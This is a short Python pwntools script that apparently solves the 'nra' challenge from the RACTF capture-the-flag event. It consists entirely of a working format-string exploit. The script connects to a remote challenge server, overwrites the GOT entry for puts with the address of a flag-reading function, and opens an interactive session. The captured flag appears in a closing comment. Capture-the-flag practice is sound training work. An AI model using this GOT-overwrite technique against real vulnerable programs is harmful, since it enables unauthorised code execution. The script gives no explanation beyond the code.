#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
debug = 0

if debug:
    io = process(['./nra'])
else:
    io = remote('88.198.219.20', 52201)

binary = ELF('./nra')
readflag = binary.symbols['flaggy']
# .got puts address
puts = 0x0804c018

payload  = b''
payload += fmtstr_payload(4, {puts: readflag})

io.recvuntil('How are you finding RACTF?')
io.sendline(payload)

io.interactive()
#ractf{f0rmat_Str1nG_fuN}
